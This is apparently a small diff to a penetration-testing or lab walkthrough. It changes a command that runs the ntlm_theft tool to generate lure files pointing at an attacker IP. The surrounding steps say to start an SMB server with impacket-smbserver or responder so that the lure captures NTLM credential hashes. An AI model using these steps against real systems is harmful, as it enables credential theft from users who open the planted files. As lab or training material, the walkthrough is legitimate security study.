@@ -17,7 +17,7 @@ git clone https://github.com/Greenwolf/ntlm_theft.git
 2. Create an .lnk file which connects to our local ip.
 
 ```
-python3 ntlm_theft.py -g uri -s 192.168.45.220 -f vault
+python3 ntlm_theft.py -g all -s 10.10.14.57 -f hacked
 ```
 
 3. Start up our smb server via impacket-smbserver OR responder
